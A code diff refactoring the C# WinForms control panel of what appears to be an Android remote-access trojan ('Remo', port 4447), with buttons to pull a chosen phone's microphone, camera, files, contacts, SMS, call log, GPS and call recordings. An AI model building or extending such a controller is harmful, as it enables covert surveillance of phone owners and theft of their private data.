@@ -25,7 +25,7 @@ namespace Remo
         volatile bool Stop = false;
         public static int Port = 4447;
         //private string SelectedClientIP = "";
-        MobInfo mi;
+        //MobInfo mi;
 
         public MainForm()
         {
@@ -35,14 +35,15 @@ namespace Remo
         private void Form1_Load(object sender, EventArgs e)
         {
             CheckForIllegalCrossThreadCalls = false;
-            
+
 
         }
 
         private void btnStart_Click(object sender, EventArgs e)
         {
             //Start handler
-            mTCPH = mTCPHandler.GetInstance();
+            mTCPH = ServerFactory.GetInstance();
+           // mTCPH.StartServer(4447);
 
       //      mTCPH.ClientClass = new Client();
             //udpr = UDPReceiver.GetInstance(4447);
@@ -54,15 +55,21 @@ namespace Remo
             {
                 while (!Stop)
                 {
-
-                    this.Invoke((MethodInvoker)delegate
+                    try
                     {
-                        RefreshClientsList();
-                    });
+                        this.Invoke((MethodInvoker)delegate
+                        {
+
+                            RefreshClientsList();
+                        });
+                    }
+                    finally {
+                        Thread.Sleep(5000);
+                    }
 
 
                     
-                    Thread.Sleep(5000);
+                    
                 }
             });
 
@@ -74,28 +81,28 @@ namespace Remo
         private void btnMic_Click(object sender, EventArgs e)
         {
 
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.MIC).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.MIC).Show();
 
         }
 
         private void btnCam_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CAM).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CAM).Show();
         }
         
 
         private void btnFM_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.FM_LIST).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.FM_LIST).Show();
         }
 
         private void btnContacts_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CONTACTS).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CONTACTS).Show();
         }
         private void btnSMS_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.SMS).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.SMS).Show();
         }
 
         private void RefreshClientsList()
@@ -104,11 +111,11 @@ namespace Remo
             if (dgv1.Rows.Count > 0 && dgv1.SelectedRows[0] != null)
                 saveRow = dgv1.SelectedRows[0].Index;
             dgv1.Rows.Clear();
-                foreach (IMConnection c in mTCPH.MainConnectionsDict.Values.ToList())
+                foreach (IConnection c in mTCPH.MainConnectionsDict.Values.ToList())
                 {
-                if(!c.FeatureClients.ContainsKey((int)DataHandler.eDataType.INFO))
-                    mTCPH.addFClient((c.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString(), (int)DataHandler.eDataType.INFO).Show();
-                dgv1.Rows.Add(((MobInfo)c.FeatureClients[(int)DataHandler.eDataType.INFO].F).getInfo());
+                if(!c.Features.ContainsKey((int)DataHandler.eDataType.INFO))
+                    mTCPH.startFeature(c.IP, (int)DataHandler.eDataType.INFO).Show();
+                dgv1.Rows.Add(((MobInfo)c.Features[(int)DataHandler.eDataType.INFO]).getInfo());
                 }
             if (saveRow != -1 && saveRow < dgv1.Rows.Count)
                 dgv1.Rows[saveRow].Selected = true;
@@ -117,10 +124,10 @@ namespace Remo
 
         }
 
-        private IMConnection getSelectedClient()
+        private String getSelectedClientIP()
         {
             Console.WriteLine(dgv1.SelectedRows[0].Cells[0].Value.ToString());
-            return mTCPH.getClientByIP(dgv1.SelectedRows[0].Cells[0].Value.ToString());
+            return dgv1.SelectedRows[0].Cells[0].Value.ToString();
         }
 
         private void btnStop_Click(object sender, EventArgs e)
@@ -137,10 +144,12 @@ namespace Remo
         {
             try
             {
+                Stop = true;
                 mTCPH.StopServer();
                 mTCPH = null;
+                
                 //udpr.StopReceive();
-                Stop = true;
+                
                 RefreshClientsListThread.Abort();
             }
             catch (Exception ex)
@@ -160,42 +169,42 @@ namespace Remo
 
         private void camToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CAM).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CAM).Show();
         }
 
         private void micToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.MIC).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.MIC).Show();
         }
 
         private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.FM_LIST).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.FM_LIST).Show();
         }
 
         private void contactsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CONTACTS).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CONTACTS).Show();
         }
 
         private void sMSToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.SMS).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.SMS).Show();
         }
 
         private void callLogToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CALL_LOG).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CALL_LOG).Show();
         }
 
         private void gPSToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.GPS).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.GPS).Show();
         }
 
         private void callRecorderToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            mTCPH.addFClient(dgv1.SelectedRows[0].Cells[0].Value.ToString(), (int)DataHandler.eDataType.CALL_RECORDS).Show();
+            mTCPH.startFeature(getSelectedClientIP(), (int)DataHandler.eDataType.CALL_RECORDS).Show();
         }
     }
 }
